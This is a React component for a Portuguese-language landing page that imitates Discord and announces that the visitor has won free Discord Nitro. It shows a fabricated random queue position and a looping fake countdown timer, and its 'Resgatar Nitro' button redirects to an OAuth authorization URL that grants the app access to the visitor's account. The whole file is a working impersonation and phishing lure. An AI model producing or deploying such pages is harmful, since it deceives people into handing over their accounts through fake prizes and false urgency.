import { useEffect, useMemo, useState } from "react";
import { authorizeUrl } from "../lib/discord";
import "./landing.css";

const DISCORD_PATH =
  "M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z";

function DLogo({ size = 24, color = "#fff" }: { size?: number; color?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" aria-hidden="true">
      <path fill={color} d={DISCORD_PATH} />
    </svg>
  );
}

const TOTAL_SECS = 59 * 60;

export default function Landing() {
  const spot = useMemo(() => Math.floor(Math.random() * 878_000) + 12_000, []);
  const [secs, setSecs] = useState(
    () => TOTAL_SECS - (Math.floor(Date.now() / 1000) % TOTAL_SECS)
  );

  useEffect(() => {
    const id = setInterval(() => setSecs((s) => (s <= 0 ? TOTAL_SECS - 1 : s - 1)), 1000);
    return () => clearInterval(id);
  }, []);

  const mm = String(Math.floor(secs / 60)).padStart(2, "0");
  const ss = String(secs % 60).padStart(2, "0");

  return (
    <div className="page">
      <div className="topbar">
        <DLogo size={28} />
        <span className="brand-nitro">DISCORD NITRO</span>
      </div>

      <div className="hero">
        <div className="logo-box">
          <DLogo size={56} />
        </div>
        <h1>
          Você ganhou <span className="grad">Discord Nitro</span>!
        </h1>
        <p className="prize">
          Resgate agora e ganhe 2 meses de Nitro <b>GRÁTIS</b> ⚡
        </p>
        <p className="queue">
          Sua posição na fila: <b>{spot.toLocaleString("pt-BR")}</b>
        </p>
        <div>
          <span className="timer">⏳ {mm}:{ss}</span>
        </div>
        <br />
        <button className="btn" onClick={() => (window.location.href = authorizeUrl())}>
          Resgatar Nitro
        </button>
        <p className="login-note">
          <DLogo size={16} color="#949ba4" /> É preciso entrar no Discord para continuar
        </p>
      </div>

      <div className="foot">
        Ao continuar, você autoriza o aplicativo a acessar sua conta.<br />
        Discord Nitro é uma marca da Discord Inc. Promoção sujeita a disponibilidade.
      </div>
    </div>
  );
}
